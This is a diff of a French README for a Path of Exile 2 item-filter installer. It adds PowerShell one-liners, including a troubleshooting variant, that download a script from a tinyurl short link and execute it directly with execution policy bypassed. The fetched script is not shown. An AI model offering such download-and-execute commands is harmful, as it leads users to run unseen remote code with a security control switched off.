@@ -7,10 +7,20 @@ Filtre d'items **NeverSink** (strictness *Strict*) avec mes **sons personnalisé
 `Win + R`, colle ça, `Entrée` :
 
 ```
-powershell -c "[Net.ServicePointManager]::SecurityProtocol='Tls12'; &([scriptblock]::Create((irm https://tinyurl.com/2b2xuyal))) -Full"
+powershell -ExecutionPolicy Bypass -c "[Net.ServicePointManager]::SecurityProtocol='Tls12'; &([scriptblock]::Create((irm https://tinyurl.com/2b2xuyal))) -Full"
 ```
 
 Pas besoin d'admin. Ça télécharge le dernier filtre NeverSink, applique les sons custom, et copie **toutes les variantes de strictness** (Soft → Uber Plus Strict) **et** les .mp3 dans ton dossier `Documents\My Games\Path of Exile 2`.
+
+## ❓ Si rien ne se passe / la fenêtre se ferme aussitôt
+
+Ouvre PowerShell (touche Windows → tape `powershell` → Entrée), colle **ceci** et regarde le message (la fenêtre reste ouverte) :
+
+```
+powershell -NoExit -ExecutionPolicy Bypass -c "[Net.ServicePointManager]::SecurityProtocol='Tls12'; try { &([scriptblock]::Create((irm https://tinyurl.com/2b2xuyal))) -Full } catch { Write-Host $_.Exception.Message -ForegroundColor Red }"
+```
+
+Si un message d'erreur s'affiche, envoie-le : il indique la cause (souvent la stratégie d'exécution PowerShell, un antivirus/proxy d'entreprise qui bloque le téléchargement, ou pas d'accès internet).
 
 ## 🎮 En jeu
 
